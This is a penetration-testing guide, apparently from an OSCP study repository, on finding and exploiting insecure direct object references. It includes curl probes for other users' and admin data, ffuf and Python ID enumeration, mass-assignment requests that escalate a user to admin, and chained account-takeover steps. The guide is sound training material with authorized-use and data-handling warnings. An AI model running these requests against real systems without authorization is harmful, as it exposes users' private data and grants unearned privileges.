# IDOR (Insecure Direct Object Reference)

> IDOR: the application exposes a reference to an internal object
> (user ID, order ID, file name) and does not verify the caller owns it.

> [!CAUTION]
> Authorized use only. See [../../SECURITY.md](../../../SECURITY.md).

---

## Table of Contents

- [1. Overview](#1-overview)
- [2. Scope & OPSEC](#2-scope--opsec)
- [3. Detection](#3-detection)
- [4. Exploitation](#4-exploitation)
- [5. Automation](#5-automation)
- [6. Chained IDOR](#6-chained-idor)
- [7. Tools](#7-tools)
- [8. OSCP Notes](#8-oscp-notes)
- [9. Cheatsheet](#9-cheatsheet)
- [10. References](#10-references)

---

## 1. Overview

IDOR = access control bug. The application takes an identifier from the
user and returns the object without checking authorization.

**Two directions:**

| Direction | Meaning | Example |
|-----------|---------|---------|
| Horizontal | Same role, different user | Alice reads Bob messages |
| Vertical | Lower role, higher privilege | Regular user reads admin-only data |

**ID types:**

| Type | Example | Difficulty |
|------|---------|------------|
| Sequential | /user/1001, /user/1002 | Trivial to brute |
| UUID v4 | /user/550e8400-e29b-41d4-a716-446655440000 | Hard to guess, need source |
| Hash | /user/5d41402abc4b2a76b9719d911017c592 | May be reversible |
| Base64 | /user/dXNlcjoxMDAx | Trivially decodable |
| JWT claim | id in JWT payload | Depends on signature |

**On OSCP:** IDOR often appears on the foothold (access another user data)
or on the privesc path (admin-only feature).

---

## 2. Scope & OPSEC

### 2.1 Risk

| Action | Tag |
|--------|-----|
| Access your own object with a different ID (single request) | [PROD-RISK] |
| Enumerate IDs across a range (brute) | [PROD-NO] |
| Access other users real data | [PROD-NO] |
| Access admin-only endpoints via IDOR | [PROD-NO] |

### 2.2 What NOT to do (production)

- Do NOT mass-enumerate IDs (thousands of requests, retrieves real user data).
- Do NOT exfiltrate real user data.
- Do NOT test IDOR on admin endpoints without written approval.
- Do NOT keep copies of retrieved PII.

In production, prove IDOR with two adjacent IDs (yours and the next),
redact other users data in the report, stop.

### 2.3 Rate limiting

For automation (ffuf over IDs), throttle aggressively:

```bash
ffuf -u 'http://target/api/user/FUZZ' -w ids.txt -rate 5 -t 2
```

---

## 3. Detection

### 3.1 Where to look

- URL path: /user/1001, /order/555, /invoice/download/12
- URL query: ?user_id=1, ?order=2, ?doc=3
- POST body: {"user_id": 1, "action": "view"}
- POST form: user_id=1
- Cookies: user_id=1, session_id=..., but also custom like uid=1
- Headers: X-User-Id: 1 (rare, but happens)
- JWT claims: decode and check for id, sub, uid
- GraphQL: query { user(id: 1) { email } }

### 3.2 ID patterns

**Sequential (1, 2, 3...):**

- Trivial: decrement / increment by 1.
- Try adjacent IDs first, then probe +/- 100.

**UUID v4:**

- Not guessable. Sources:
  - Your own account UUID (try it in a different endpoint).
  - Error messages leaking other UUIDs.
  - Public user lists (comments, shares).
  - API responses you can read (created_by, owner_id).
- Sometimes UUID v1 (timestamp-based) is predictable.

**Hash IDs:**

- Try common hashes: md5, sha1, sha256 of simple values (1, 2, admin).
  - md5("1") = c4ca4238a0b923820dcc509a6f75849b
  - Try: echo -n "1" | md5sum
- Some apps use hashids library (reversible if salt leaks).

**Base64:**

```bash
echo 'dXNlcjoxMDAx' | base64 -d
# -> user:1001
```

If you can decode and encode, you control the ID.

**JWT claim:**

```bash
# Decode JWT payload
echo 'eyJ...payload...' | base64 -d
# -> {"sub":"1001","role":"user"}
```

If the JWT signature is not validated (alg:none or weak secret), you can
change sub / role. See [../06 Technologies/JWT.md](../06%20Technologies/JWT.md)
(once published).

---

## 4. Exploitation

### 4.1 Horizontal IDOR

Same role, different user.

```bash
# Your own account
curl 'http://target/api/user/1001' -H 'Cookie: session=YOUR_SESSION'

# Another user
curl 'http://target/api/user/1002' -H 'Cookie: session=YOUR_SESSION'
```

**Expected output (vulnerable):**

```text
{"id":1002,"email":"other@user.com","role":"user"}
```

You are reading data that does not belong to your account.

### 4.2 Vertical IDOR

Lower role, higher privilege.

```bash
# Your own endpoint (user)
curl 'http://target/api/me' -H 'Cookie: session=USER'

# Admin-only endpoint
curl 'http://target/api/admin/users' -H 'Cookie: session=USER'
curl 'http://target/api/user/1' -H 'Cookie: session=USER'
```

If the admin data returns, you have vertical IDOR.

### 4.3 Encoded IDs

```bash
# Base64
curl 'http://target/api/user/dXNlcjoxMDAx' -H 'Cookie: session=YOUR'

# Hash (md5 of the ID)
curl 'http://target/api/user/c4ca4238a0b923820dcc509a6f75849b' -H 'Cookie: session=YOUR'

# Hex
curl 'http://target/api/user/0x3E9' -H 'Cookie: session=YOUR'
```

Decode -> change -> re-encode.

### 4.4 GraphQL IDOR

```graphql
# Your own user
query { user(id: 1001) { email role } }

# Another user
query { user(id: 1002) { email role } }
```

Send via POST with Content-Type: application/json:

```bash
curl 'http://target/graphql' -H 'Content-Type: application/json' -d '{"query":"{ user(id: 1002) { email role } }"}'
```

> See also: [../../03 API/03 GraphQL.md](../../03%20API/03%20GraphQL.md) (once published).

### 4.5 Mass assignment through IDOR

When you can update your own object, try to add fields you should not
control (role, is_admin, balance).

```bash
# Original update
curl -X PUT 'http://target/api/user/1001' -H 'Content-Type: application/json' \\\\
     -d '{"name":"alice"}' -H 'Cookie: session=USER'

# Mass assignment attempt
curl -X PUT 'http://target/api/user/1001' -H 'Content-Type: application/json' \\\\
     -d '{"name":"alice","role":"admin"}' -H 'Cookie: session=USER'
```

If the response includes role:admin, mass assignment worked.

> See also: [../../03 API/02 REST.md](../../03%20API/02%20REST.md) (once published).

---

## 5. Automation

### 5.1 Burp Autorize

Autorize is a Burp extension that replays every request with a different
user session and flags responses that are still accessible.

Workflow:

1. Install Autorize from BApp Store.
2. Configure it with a low-privilege session (or no session).
3. Browse the application as a normal user.
4. Autorize highlights endpoints accessible with the low-priv session.

### 5.2 ffuf over IDs

```bash
seq 1 5000 > ids.txt
ffuf -u 'http://target/api/user/FUZZ' -w ids.txt \\\\
     -H 'Cookie: session=USER' -mc 200 -fs 0 -rate 5 -t 2
```

Filter by response size to remove the default 404/403 page.

### 5.3 Custom Python comparator

```python
import requests

s = requests.Session()
s.cookies.set('session', 'USER')

baseline = s.get('http://target/api/user/1001').text

for uid in range(1002, 1010):
    r = s.get(f'http://target/api/user/{uid}')
    if r.status_code == 200 and r.text != baseline:
        print(f'[+] {uid}: {r.text[:80]}')
```

---

## 6. Chained IDOR

### 6.1 IDOR + IDOR -> account takeover

1. IDOR reads another user email (account enumeration).
2. IDOR triggers password reset for that email.
3. IDOR reads the reset token from the response (if leaked).
4. Reset the password and log in.

### 6.2 IDOR + info leak -> admin access

1. IDOR on a user list endpoint leaks admin IDs.
2. IDOR on /user/[admin-id] returns their details.
3. Reuse admin session or ID for admin actions.

### 6.3 IDOR + JWT

1. IDOR leaks a JWT (in a response, log, or share link).
2. Decode JWT, find role / sub claims.
3. If signature is weak, forge admin JWT.
4. Access admin endpoints.

---

## 7. Tools

| Tool | Purpose |
|------|---------|
| Burp Autorize | Automatic IDOR detection via session swap |
| ffuf | Brute ID parameter |
| Caido | Alternative to Burp with similar features |
| Postman | Manual multi-user testing |
| hashid | Identify hash type |

Examples:

```bash
# hashid
hashid c4ca4238a0b923820dcc509a6f75849b
```

---

## 8. OSCP Notes

> [!IMPORTANT]
> OSCP report:
> - Screenshot your own object (baseline).
> - Screenshot the same request with another user / admin ID.
> - Screenshot the response proving access to data you should not see.
> - Redact other users PII in the report.
>
> IDOR alone is a finding. IDOR leading to credentials, admin access, or
> data that enables privesc is the exam chain.
>
> See [../../methodology/OSCP-Reporting.md](../../../methodology/OSCP-Reporting.md).

---

## 9. Cheatsheet

```bash
# Basic probe
curl 'http://target/api/user/1001' -H 'Cookie: session=YOUR'
curl 'http://target/api/user/1002' -H 'Cookie: session=YOUR'

# Decode base64 ID
echo 'dXNlcjoxMDAx' | base64 -d

# Encode base64 ID
echo -n 'user:9999' | base64

# Mass assignment
curl -X PUT 'http://target/api/user/1001' -H 'Content-Type: application/json' \\\\
     -d '{"name":"x","role":"admin"}' -H 'Cookie: session=USER'

# ffuf brute
ffuf -u 'http://target/api/user/FUZZ' -w ids.txt -H 'Cookie: session=USER' -mc 200 -rate 5
```

---

## 10. References

- OWASP IDOR - https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References
- PortSwigger access control - https://portswigger.net/web-security/access-control
- Burp Autorize - https://github.com/Quitten/Autorize
- PayloadsAllTheThings IDOR - https://github.com/swisskyrepo/PayloadsAllTheThings

> See also: [../06 Technologies/JWT.md](../06%20Technologies/JWT.md), [../../03 API/03 GraphQL.md](../../03%20API/03%20GraphQL.md), [../../03 API/02 REST.md](../../03%20API/02%20REST.md)

---

*Part of Bugterium. English only by design. Last updated: 2026-10-11.*
